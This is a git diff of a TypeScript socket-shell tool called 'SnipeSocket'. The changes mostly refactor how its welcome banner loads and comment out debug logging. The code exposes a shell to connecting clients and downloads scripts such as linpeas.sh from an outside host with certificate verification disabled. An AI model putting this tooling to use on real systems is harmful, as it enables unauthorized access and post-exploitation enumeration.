@@ -10,11 +10,13 @@ import https from 'https';
 import tty, { ReadStream, WriteStream } from 'tty';
 import stream, { Duplex, Readable, Writable } from 'stream';
 
-require('tls').DEFAULT_ECDH_CURVE = 'auto';
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+// require('tls').DEFAULT_ECDH_CURVE = 'auto';
+// process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
 const LOAD_MAP = {
-  linpeas: 'linpeas.sh'
+  linpeas: 'linpeas.sh',
+  random: 'random.sh',
+  slideshow: 'slideshow.sh'
 };
 
 const WEB_HOST = 'https://f11snipe.sh/sh';
@@ -146,9 +148,9 @@ class SnipeSocket {
     })
   }
 
-  public get isNexe(): boolean {
-    return !!process['__nexe'];
-  }
+  // public get isNexe(): boolean {
+  //   return !!process['__nexe'];
+  // }
 
   public get sysinfo(): ISystemInfo {
     return getSystemInfo();
@@ -250,9 +252,7 @@ class SnipeSocket {
   public download(file, url, cb?: (err?: Error) => void): http.ClientRequest {
     let localFile = fs.createWriteStream(file);
 
-    const headers = { 'Transfer-Encoding': 'chunked' };
-
-    return https.request(url, { headers, rejectUnauthorized: false }, (response) => {
+    return https.get(url, { rejectUnauthorized: false }, (response) => {
       const rep = response.headers['content-length'];
       var len = rep ? parseInt(rep, 10) : 0;
       var cur = 0;
@@ -285,29 +285,26 @@ class SnipeSocket {
     this.sock.write(`${NEWLINE}${PROMPT}`);
   }
 
-  public welcome(isNexe = false): void {
-    let banner = 'assets/welcome.txt';
+  public welcome(art = 'welcome.txt'): void {
+    const banner = path.join(__dirname, '../assets', art);
+    // let banner = 'assets/welcome.txt';
     let body = 'Welcome to SnipeSocket!';
 
     try {
-      msg('debug', `Attempt to load txt art file: ${banner}`);
+      msg('debug', `Loading asset: ${banner}`);
 
-      console.log(`Checking for msgs/assets`, process['__nexe']?.resources);
-
-      if (false) {
-        body = colors.blue(require(banner));
-        msg('info', `[NEXE] Read banner: ${body}`);
-      } else if (fs.existsSync(banner)) {
-        body = colors.blue(fs.readFileSync(banner).toString());
-        msg('info', ` [F11] Read banner: ${body}`);
-      } else {
-        body = `[fallback] ${body}`
-        msg('info', ` [F11] Fallback banner: ${body}`);
-      }
+      body = colors.blue(require(banner));
+      msg('info', `[PKG] Read banner: ${body}`);
     } catch (err) {
-      msg('warn', `Caught error reading msg text files, falling back`);
-      console.log(err);
-      this.sock.write('Welcome!');
+      if (fs.existsSync(banner)) {
+        body = colors.blue(fs.readFileSync(banner).toString());
+        msg('info', `[F11] Read banner: ${body}`);
+      } else {
+        console.log(err);
+        msg('warn', `Caught error reading msg text files, falling back`);
+        body = colors.blue(body);
+        // this.sock.write('Welcome!');
+      }
     }
 
     this.sock.write(body);
@@ -409,10 +406,10 @@ server.listen(PORT, HOST, () => {
   msg('good', `SHELL: ${findShell()}`)
 });
 
-console.log('process.__nexe', process['__nexe']);
-console.log('process.env', process['env']);
-console.log('process.args', process.argv.join(' '));
-console.log('getSystemInfo()', getSystemInfo());
+// console.log('process.__nexe', process['__nexe']);
+// console.log('process.env', process['env']);
+// console.log('process.args', process.argv.join(' '));
+// console.log('getSystemInfo()', getSystemInfo());
 
 // Main handler for new connections
 server.on('connection', (sock: net.Socket) => {
@@ -422,7 +419,7 @@ server.on('connection', (sock: net.Socket) => {
   msg('info', `[${socket.sig}] New Connection`);
 
   try {
-    socket.welcome();
+    socket.welcome('glhf.txt');
 
     socket.sock.on('close', (hadError: boolean) => {
       if (hadError) log(`Socket.on(close) with error!`);
